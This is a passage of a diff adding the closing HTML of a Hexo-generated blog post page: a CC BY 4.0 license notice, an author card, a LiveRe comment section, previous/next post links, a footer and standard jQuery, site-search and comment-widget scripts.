+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/jaydodson" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/THE1.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/jaydodson" target="_blank"><span class="text-dark">m0s</span><small class="ml-1x">信安之路。</small></a></h3>
+        <div>我也不知道说啥。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NjIyNi8yMjczNw==">
+        <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+      </div>    
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2019/09/29/WEB%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0/" title="第九周，WEB页面解析的流程学习"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2019/08/27/Ubuntu18-04%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" title="Ubuntu18.04网络配置"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">
+        <span>[&nbsp;</span><span>文章目录</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,wechat,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/jaydodson" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2020 Jay Dodson
+        
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+<script defer type="text/javascript">
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+
+    if (typeof LivereTower === 'function') { return; }
+
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+
+
+
+
+
+
+</body>
+</html>
